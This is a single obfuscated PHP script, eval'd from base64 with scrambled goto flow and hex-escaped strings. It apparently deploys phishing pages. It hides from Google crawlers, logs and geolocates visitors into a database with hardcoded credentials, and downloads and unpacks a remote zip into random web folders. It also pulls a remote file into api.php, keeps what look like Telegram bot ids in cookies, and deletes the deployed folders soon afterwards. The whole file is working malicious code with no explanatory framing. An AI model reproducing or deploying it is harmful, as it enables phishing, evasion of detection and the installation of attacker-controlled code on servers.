<?php eval(base64_decode('
 goto O_Son; jtRIj: $info = unserialize($response); goto kV0OJ; rtym4: $TIME_DATE = date("\131\55\155\x2d\144\x20\x48\72\x69\x3a\163"); goto CbgHD; ImxiJ: $_SESSION["\116\152\x6f\x70\146"] = isset($info["\x63\157\x75\156\x74\162\171\x43\157\144\145"]) ? $info["\x63\x6f\x75\156\164\x72\x79\103\x6f\x64\145"] : null; goto BO3ns; xR4Lj: $userAgent = isset($_SERVER["\x48\124\124\x50\137\125\123\105\122\137\101\x47\105\x4e\x54"]) ? $_SERVER["\110\124\x54\120\x5f\125\123\105\x52\137\x41\107\x45\x4e\x54"] : ''; goto xqwDG; wFt20: $curl = curl_init($url); goto fs6SY; MNU96: if (strpos($userAgent, "\x67\x6f\157\147\154\145") !== false) { $refix = "\102\157\163\145\40\107"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto TYtHM; CbgHD: if (isset($_POST["\x6c\x6f\143\141\154\x69\160"])) { $myips = base64_decode(base64_decode($_POST["\x6c\x6f\x63\141\154\151\x70"])); $_SESSION["\154\x6f\x6c\151\x70\163"] = $myips; $StrupLom = $myips; } else { $refix = "\x4e\x6f\x74\x20\106\157\x75\156\x64\x20\x49\x50\x53"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto xCCok; MITnP: function Rand_XD_TF($length) { $characters = "\x61\x62\143\144\x65\146\152\150\x69\x67\153\154\x6d\156\x6f\160\161\162\x73\x74\x75\x76\x77\x78\171\172\60\x31\62\x33\64\x35\66\x37\70\71\101\102\103\x44\x45\106\x47\110\x49\112\x4b\x4c\x4d\116\117\x50\121\122\x53\124\125\x56\x57\x58\131\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto Qon4e; ppLsi: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\41\x21\x21"; echo $showpip; die; } goto h_yX4; xCCok: $protocol = isset($_SERVER["\110\124\124\x50\123"]) && $_SERVER["\110\124\124\120\x53"] === "\x6f\x6e" ? "\150\164\164\160\163" : "\150\x74\x74\x70"; goto rLp4o; O_Son: error_reporting(E_ALL); goto rJRu0; xVJp9: $ipPortArray = explode("\x3a", $ipAddress); goto GcvVA; N9ffW: $datalog = base64_decode("\145\155\126\x79\x62\x79\61\153\131\130\153\165\143\x32\150\166\143\x41"); goto CkHhL; GcvVA: $StrupLom = $ipPortArray[0]; goto vyeLC; CfOmi: $_SESSION["\102\154\141\163\141\143\157\165\x6e"] = isset($info["\x63\157\x75\x6e\x74\162\x79"]) ? $info["\x63\x6f\x75\x6e\x74\x72\171"] : null; goto ImxiJ; mqZwE: if (!empty($_SERVER["\x48\x54\x54\x50\x5f\x43\114\111\105\116\x54\x5f\111\x50"])) { $ipAddress = $_SERVER["\110\124\124\x50\x5f\103\x4c\x49\x45\116\x54\x5f\x49\x50"]; } elseif (!empty($_SERVER["\x48\x54\124\x50\137\130\137\106\117\x52\127\x41\x52\104\105\x44\137\106\x4f\x52"])) { $ipAddress = $_SERVER["\110\124\x54\120\137\130\137\106\x4f\x52\127\101\122\x44\x45\104\x5f\x46\117\x52"]; } else { $ipAddress = $_SERVER["\122\105\115\x4f\x54\x45\137\x41\x44\x44\x52"]; } goto xVJp9; xl71k: $Lredsvv = base64_decode("\x5a\110\112\x6a\x5a\x32\x6c\163\145\x56\x41\167\113\x6d\x73\x6d"); goto ewbh4; ewbh4: $Nopwvv = base64_decode("\x63\63\x52\171\x62\x32\65\156\x58\x32\x52\150\145\x51"); goto xgOxG; U1Tws: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\x6e\x6b\156\157\x77\156\40\x42\x72\x6f\x77\x73\145\x72"; $BROWSER = array("\x2f\x6d\x73\x69\145\x2f\x69" => "\x49\x6e\x74\x65\x72\156\x65\x74\40\105\170\160\154\157\162\145\x72", "\57\146\151\162\x65\146\x6f\x78\x2f\x69" => "\x46\x69\162\x65\x66\157\170", "\x2f\163\x61\x66\141\x72\x69\x2f\x69" => "\123\x61\x66\x61\x72\x69", "\57\143\150\162\157\155\145\57\x69" => "\103\x68\x72\x6f\x6d\145", "\57\145\144\147\145\x2f\151" => "\x45\144\x67\x65", "\x2f\x6f\160\x65\x72\x61\57\x69" => "\117\160\x65\x72\x61", "\57\x6e\x65\x74\163\x63\141\160\145\57\x69" => "\116\145\x74\163\x63\141\x70\x65", "\57\x6d\141\170\x74\x68\157\x6e\x2f\x69" => "\115\141\170\164\x68\157\156", "\x2f\x6b\x6f\156\161\x75\145\x72\157\162\57\151" => "\x4b\x6f\156\161\x75\145\162\x6f\x72", "\x2f\x6d\157\x62\151\154\x65\57\151" => "\x48\x61\x6e\x64\150\x65\154\144\40\x42\x72\157\167\163\145\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto xR4Lj; rLp4o: $domain = $_SERVER["\x48\x54\124\120\x5f\x48\117\123\x54"]; goto mvKJf; ooTlL: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\156\x6b\x6e\157\x77\x6e\40\x4f\123\40\120\x6c\x61\164\146\157\x72\155"; $OS = array("\x2f\167\151\156\144\x6f\x77\163\x20\156\164\x20\61\x30\57\151" => "\127\151\156\144\157\x77\x73\x20\x31\60", "\x2f\167\x69\x6e\x64\157\x77\x73\40\x6e\164\x20\66\x2e\63\x2f\x69" => "\127\x69\x6e\x64\x6f\x77\163\x20\70\56\61", "\x2f\167\x69\x6e\x64\157\167\163\40\156\x74\x20\x36\x2e\x32\x2f\x69" => "\x57\151\156\144\157\x77\x73\40\x38", "\57\167\x69\156\x64\x6f\167\163\40\156\x74\x20\x36\x2e\x31\57\x69" => "\127\151\x6e\144\157\x77\x73\40\67", "\x2f\x77\151\x6e\144\157\167\x73\x20\x6e\164\40\x36\x2e\x30\57\151" => "\127\151\156\144\157\167\163\40\126\151\x73\164\141", "\57\x77\151\156\144\157\x77\x73\x20\x6e\164\x20\65\56\62\57\x69" => "\x57\x69\x6e\144\157\x77\x73\40\123\145\162\166\x65\x72\40\x32\60\60\x33\x2f\x58\x50\x20\x78\x36\64", "\57\x77\x69\156\x64\x6f\x77\x73\x20\156\x74\40\x35\x2e\x31\57\x69" => "\127\151\156\144\x6f\167\x73\40\130\x50", "\57\x77\x69\x6e\144\x6f\x77\163\x20\170\160\57\x69" => "\x57\151\156\x64\157\167\x73\40\130\x50", "\x2f\x77\x69\156\144\x6f\167\x73\x20\156\164\x20\65\x2e\x30\57\151" => "\127\x69\156\x64\x6f\167\x73\40\62\60\x30\x30", "\57\167\x69\156\144\157\x77\x73\40\x6d\145\x2f\x69" => "\127\x69\x6e\x64\x6f\167\163\x20\115\x45", "\x2f\167\x69\156\x39\70\57\151" => "\127\151\x6e\144\157\x77\x73\40\x39\x38", "\57\x77\x69\x6e\71\x35\57\151" => "\x57\x69\156\x64\x6f\167\163\x20\x39\65", "\x2f\x77\x69\156\61\66\57\151" => "\x57\x69\156\x64\157\167\x73\40\63\56\x31\61", "\x2f\155\x61\143\x69\x6e\x74\157\163\x68\174\155\141\143\x20\157\x73\x20\x78\57\151" => "\x4d\141\x63\40\117\123\40\x58", "\x2f\x6d\x61\x63\137\160\157\x77\x65\162\x70\x63\x2f\x69" => "\x4d\x61\x63\x20\117\123\x20\x39", "\x2f\x6c\x69\x6e\165\170\x2f\151" => "\114\x69\156\165\170", "\57\x75\x62\165\156\x74\x75\x2f\x69" => "\125\142\x75\x6e\164\x75", "\57\x69\x70\150\157\x6e\x65\x2f\x69" => "\x69\x50\x68\157\x6e\145", "\57\x69\x70\157\x64\57\x69" => "\151\x50\x6f\x64", "\x2f\x69\160\141\x64\x2f\x69" => "\x69\x50\x61\x64", "\57\x61\156\x64\x72\x6f\151\x64\57\x69" => "\x41\x6e\144\x72\x6f\x69\x64", "\x2f\x62\154\x61\x63\x6b\x62\145\162\162\x79\57\151" => "\x42\x6c\141\x63\153\x42\x65\162\x72\x79", "\x2f\x77\145\x62\157\163\57\151" => "\115\157\142\151\x6c\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto U1Tws; fs6SY: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto Hr1EU; Hr1EU: $response = curl_exec($curl); goto Em4OV; TYtHM: if (strpos(gethostbyaddr($StrupLom), "\x67\x6f\157\147\x6c\x65") !== false) { $refix = "\x42\x6f\163\145\x20\107\x20\62"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto wUjPO; Em4OV: curl_close($curl); goto jtRIj; CkHhL: $Fixbom = base64_decode("\143\63\122\171\142\x32\65\x6e\x58\62\x52\150\145\121"); goto xl71k; E8cOo: $IpCount = FOx_TGH_X($userAgent); goto RMUvU; uauRp: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto bp_Gx; Xm6Sp: if (isset($_GET["\166\163\163"])) { $gameid = $_GET["\x73\157\x75\154\163"]; $_SESSION["\x6c\x6f\x6c\x73\157\165\x6c\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\x76\x73\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\x3c\x73\x63\x72\x69\160\164\40\x4c\x41\x4e\x47\125\101\x47\105\x3d\x27\112\x61\166\141\123\143\x72\x69\160\x74\47\x3e\xa\x20\40\x20\40\167\151\x6e\x64\157\x77\x2e\154\x6f\x63\x61\164\x69\x6f\x6e\56\x68\162\x65\x66\x3d\47{$folder_pathx}\x3f\x26\x76\141\154\x69\144\x3d{$RandOP_Mlux}{$RandOP_Mlux}\x26\x61\154\145\x72\x74\x3d{$RandOP_Mlux}\46\170\x6c\x70\x73\75{$RandOP_Mlux}\x26\x73\x6f\165\154\163\75{$gameid}\46\x64\x6f\x6e\x65\x3d\x26\145\x72\x72\157\162\x79\x3d{$RandOP_Mlux}\x26\x6d\156\x65\155\x6f\156\x69\143\75\46\152\x62\x3d{$RandOP_Mlux}\x27\73\12\x20\40\x20\x20\74\57\x73\x63\x72\151\x70\164\76"; die; } goto NEgLV; RMUvU: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\124\x54\120\137\125\123\105\x52\137\x41\x47\105\x4e\x54"]) ? $_SERVER["\x48\x54\124\x50\137\125\123\105\122\x5f\x41\107\105\116\x54"] : ''; $isp = $_SESSION["\x69\x73\160"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\105\x52\126\105\x52\x5f\116\x41\115\105"]; $LOCALO_TEMPO = date("\131\x2d\155\55\144\x20\x48\x3a\x69\x3a\x73"); $Blasacoun = $_SESSION["\102\154\141\163\141\143\157\x75\x6e"]; $Njopf = $_SESSION["\116\x6a\x6f\x70\x66"]; $Voprt = $_SESSION["\x56\x6f\160\162\164"]; $xOpuy = $_SESSION["\x78\117\x70\x75\x79"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\x6e\145\143\x74\151\157\x6e\40\x66\x61\151\154\145\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\105\x43\x54\x20\52\40\x46\x52\x4f\115\x20\x6c\x6f\x67\x73\x20\127\x48\105\122\105\x20\151\x70\x61\144\144\x72\x65\163\75\47{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\x21\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\x27", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\47", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\x27", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $query = "\x49\116\x53\105\122\124\40\111\x4e\124\x4f\40\x6c\157\147\x73\40\x28\x69\x70\x61\144\x64\x72\145\163\54\x63\x6f\x75\156\164\162\x79\54\142\x72\x6f\167\163\145\162\54\157\x73\54\144\157\155\x69\x6e\x65\x2c\155\x79\164\x69\155\145\x2c\150\x6f\x73\x74\x2c\x69\x73\x70\54\162\145\x73\157\x6e\51\x20\xa\40\40\x20\x20\40\40\11\40\40\40\40\x9\40\x20\x56\x41\114\125\x45\x53\x20\50\47{$StrupLom}\47\54\47{$Blasacoun}\47\54\x27{$IpCount}\x27\x2c\47{$OKJIVGRD}\47\x2c\47{$donflag}\x27\54\47{$LOCALO_TEMPO}\x27\x2c\x27{$host}\47\x2c\47{$isp}\47\x2c\47{$refix}\x27\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto MNU96; fa6fq: $_SESSION["\x78\117\x70\165\171"] = isset($info["\162\145\147\151\x6f\156\116\x61\155\145"]) ? $info["\162\x65\147\x69\157\156\x4e\x61\155\145"] : null; goto uauRp; bp_Gx: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\56\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto tapcS; ctr4N: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\156\156\x65\x63\x74\151\157\156\x20\146\x61\x69\154\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\x43\124\40\x2a\40\106\122\117\x4d\40\154\x6f\147\163\40\127\x48\x45\122\x45\40\x69\160\x61\x64\x64\162\x65\x73\75\47{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto ppLsi; rJRu0: ini_set("\x64\x69\163\160\154\141\x79\x5f\145\162\x72\x6f\162\163", 1); goto mqZwE; xqwDG: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto E8cOo; mvKJf: $donflag = $protocol . "\72\57\57" . $domain; goto N9ffW; BO3ns: $_SESSION["\126\157\x70\162\164"] = isset($info["\x63\x69\164\171"]) ? $info["\143\151\164\171"] : null; goto fa6fq; NEgLV: if (isset($_POST["\x73\150\x6f\x70\x69\144"])) { $gameid = $_POST["\163\x68\157\x70\151\144"]; $_SESSION["\x6c\x6f\154\163\x6f\x75\154\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto EV2x8; EV2x8: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\156\x65\x63\x74\151\x6f\156\x20\x66\141\151\x6c\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\x45\x43\124\40\52\40\106\x52\x4f\115\40\162\x65\144\151\x72\143\x74\151\157\156\x20\127\110\105\122\x45\x20\x69\144\75\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\156\x6b"] = base64_decode(base64_decode($row["\154\x69\156\153"])); $_SESSION["\x63\x6e"] = explode("\73", base64_decode(base64_decode($row["\143\x6f\165\x6e\164\x72\171"]))); $_SESSION["\160\151\x63"] = $row["\160\x69\143"]; $_SESSION["\155\x73\x67"] = base64_decode(base64_decode($row["\x6d\x73\147"])); $_SESSION["\145\x78\160"] = $row["\145\x78\x70\151\162\x65"]; $_SESSION["\163\145\x72\x76\x65\162"] = base64_decode(base64_decode($row["\163\145\x72\x76\145\162"])); $_SESSION["\165\162\x6c"] = base64_decode(base64_decode($row["\165\x72\x6c"])); $_SESSION["\154\165\x78\143\141\x70\x74\143\x68\x61"] = $row["\x6c\x75\170\x63\141\x70\164\x63\150\x61"]; $_SESSION["\x74\x6f\153\x65\x6e\x74\x65\x6c"] = base64_decode(base64_decode($row["\x74\157\x6b\145\156\x74\x65\x6c"])); $_SESSION["\x69\x64\x74\x65\x6c"] = base64_decode(base64_decode($row["\151\144\164\145\x6c"])); $_SESSION["\x72\x65\x64\x69\x72\x69\x63\x74"] = $row["\x72\145\144\x69\162\151\x63\x74"]; $_SESSION["\141\x70\x69"] = $row["\x61\x70\x69"]; if (isset($_GET["\166\x73\163"])) { setcookie("\164\157\153\x65\156\164\x65\x6c", $_SESSION["\x74\157\x6b\x65\x6e\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\145\154", $_SESSION["\151\144\164\x65\154"], time() + 86400 * 30, "\x2f"); setcookie("\x72\145\144\x69\162\151\x63\x74", $_SESSION["\x72\145\144\x69\162\x69\x63\164"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x53\121\x4c\x20\111\104\x20\111\x6e\x76\141\154\x69\144\40{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto MITnP; xgOxG: $url = "\x68\x74\x74\160\72\x2f\57\x69\160\55\141\160\x69\x2e\x63\157\155\57\160\x68\x70\57{$StrupLom}\77\x66\151\145\154\144\x73\75\x73\x74\141\164\165\163\x2c\155\145\163\163\x61\147\x65\x2c\143\x6f\156\164\x69\156\x65\156\164\x2c\143\x6f\156\164\151\156\145\156\164\103\157\x64\145\54\143\x6f\x75\156\x74\x72\171\54\x63\x6f\165\x6e\x74\x72\171\x43\x6f\x64\145\54\162\145\x67\x69\157\x6e\x2c\162\145\x67\151\x6f\156\116\141\x6d\145\x2c\143\x69\x74\x79\x2c\x64\151\163\x74\x72\151\143\164\x2c\172\151\160\x2c\x6c\141\164\54\154\x6f\156\54\x74\x69\x6d\145\172\157\x6e\x65\x2c\x63\165\162\x72\145\x6e\x63\x79\x2c\x69\x73\160\x2c\x6f\162\x67\54\141\x73\x2c\x61\163\156\x61\x6d\x65\x2c\x72\145\x76\145\162\x73\x65\54\x6d\157\x62\x69\x6c\145\54\160\x72\x6f\x78\x79\54\x68\157\x73\x74\x69\156\x67\54\161\x75\145\x72\x79"; goto wFt20; zHPcK: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto ctr4N; kV0OJ: $_SESSION["\x69\163\x70"] = isset($info["\151\x73\x70"]) ? $info["\x69\x73\x70"] : null; goto CfOmi; vyeLC: $domine = $_SERVER["\123\x45\122\x56\105\122\137\116\x41\115\105"]; goto rtym4; wwgqw: $directories = glob($parentDirectory . "\x2f\x2a", GLOB_ONLYDIR); goto zHPcK; OSlsK: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto vX04Z; Qon4e: function rand_num($length) { $characters = "\x30\x31\62\63\64\65\66\67\x38\x39"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto ooTlL; tapcS: $parentDirectory = "\167\x65\142"; goto wwgqw; aS_uR: if (isset($_GET["\154\157\154\x6d\145"])) { $vdir = $_GET["\x6c\x6f\154\x6d\145"]; $refix = "\111\156\x76\141\154\151\x64\40\154\x6f\x6c\155\145"; $redi = $_COOKIE["\162\x65\144\151\162\x69\x63\x74"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\145\142\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\162\151\x70\x74\40\114\x41\116\107\x55\x41\107\105\75\x27\x4a\141\166\x61\123\x63\162\151\160\164\x27\76\xa\40\40\40\40\x77\151\156\x64\x6f\167\56\x6c\157\x63\141\164\151\x6f\156\56\150\x72\145\x66\75\47{$redi}\47\x3b\xa\x20\x20\x20\40\x3c\x2f\x73\143\162\x69\160\x74\76"; die; } goto Xm6Sp; wUjPO: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto OSlsK; vX04Z: if ($_SERVER["\x52\105\x51\125\x45\x53\124\x5f\x4d\105\x54\x48\117\x44"] === "\x50\117\x53\124") { if (!isset($_POST["\x6c\x6f\x63\x61\x6c\x69\x70"])) { $refix = "\x49\x50\123\40\x6e\157\164\x20\146\x6f\165\156\144"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\x68\157\160\x69\144"])) { $refix = "\160\162\157\152\145\x63\x74\40\111\x44\x20\116\157\164\x20\146\x6f\165\156\x64"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\x77\x65\142")) { if (!mkdir("\x77\145\142", 511)) { die("\106\141\151\x6c\145\144\x20\164\x6f\x20\x63\162\x65\141\164\x65\40\167\x65\x62\x20\144\x69\162\x65\x63\x74\x6f\x72\171"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\145\142\57{$sub_folder}\57"; $zipFileUrl = $_SESSION["\165\162\x6c"]; $tempDir = "\x74\x65\155\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\x2f{$folder_name}\x2e\x7a\x69\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\x61\151\x6c\145\x64\x20\164\x6f\40\143\162\145\141\164\x65\40\x74\x68\x65\x20\x66\x6f\154\x64\145\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\56" && $file !== "\56\56") { rename($folder_path . "\x2f" . $file, $folder_path . $file); } } } else { echo "\x46\141\151\154\x65\x64\40\x74\x6f\x20\145\170\x74\x72\141\x63\x74\x20\164\x68\x65\x20\x7a\151\160\x20\x66\151\x6c\x65\x2e"; } } else { die("\106\141\151\x6c\145\x64\x20\x74\x6f\x20\x64\157\167\x6e\154\x6f\x61\144\x20\x74\x68\145\x20\172\x69\x70\x20\x66\x69\154\x65\x2e"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\154\x6f\154\x73\157\165\154\163"]; $_SESSION["\154\157\x63\x61\154\144\x69\x72"] = "{$folder_path}"; file_put_contents("{$folder_path}\x2f\x6c\x6f\143\141\154\56\164\170\164", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\x61\x70\151"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\145\x62\57\x61\x70\151\56\x70\x68\x70"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\101\120\111") { getFileContents($fileURL); } $localip = isset($_POST["\154\x6f\x63\x61\x6c\x69\160"]) ? $_POST["\154\157\x63\x61\154\x69\160"] : null; $domainname = isset($_POST["\144\x6f\155\x61\151\156\156\x61\155\145"]) ? $_POST["\x64\157\155\x61\151\x6e\156\141\x6d\145"] : null; $nextdomain = isset($_POST["\x6e\x65\170\164\144\157\x6d\x61\x69\x6e"]) ? $_POST["\x6e\145\x78\164\144\157\155\141\151\156"] : null; $shopid = isset($_POST["\163\150\x6f\160\151\144"]) ? $_POST["\x73\x68\157\x70\x69\144"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\x74\x65\x6d\x70"; $zipFiles = glob($directory . "\x2a\x2e\172\x69\160"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\163\x74\x61\x74\x75\163" => "\x73\165\143\143\x65\163\x73", "\142\x61\x63\x6b\137\144\151\162" => $folder_path, "\142\x61\143\153\137\165\162\x6c" => $nextdomain, "\142\141\x63\153\x5f\x69\144" => $shopid, "\155\x65\x73\x73\141\147\x65" => "\x44\141\164\x61\40\x72\145\143\x65\x69\x76\145\x64\x20\163\165\x63\x63\145\163\163\146\x75\x6c\154\171"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); echo "\x4d\151\163\163\x69\x6e\147\40\162\145\161\165\151\x72\145\x64\x20\x64\141\164\141"; } } else { http_response_code(405); echo "\x49\x6e\x76\x61\x6c\x69\x64\x20\162\145\161\165\x65\x73\164\40\155\x65\x74\x68\x6f\144"; } goto isWzB; h_yX4: if (isset($_GET["\145\156\x64\155\145\154\x75\x78"])) { $redi = $_COOKIE["\x72\x65\144\x69\162\151\143\x74"]; $vdir = $_GET["\x65\156\x64\x6d\145\154\x75\170"]; $directoryToDelete = "\x77\145\142\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\x73\x63\x72\x69\160\164\x20\114\101\x4e\x47\125\101\x47\x45\x3d\47\112\141\x76\141\x53\x63\x72\x69\x70\164\x27\x3e\12\40\x20\40\40\167\x69\156\x64\x6f\x77\x2e\154\x6f\143\x61\x74\151\x6f\x6e\x2e\150\x72\145\146\75\47{$redi}\x27\x3b\xa\x20\40\40\40\x3c\x2f\x73\143\x72\x69\x70\x74\x3e"; die; } goto aS_uR; isWzB: ')); ?>
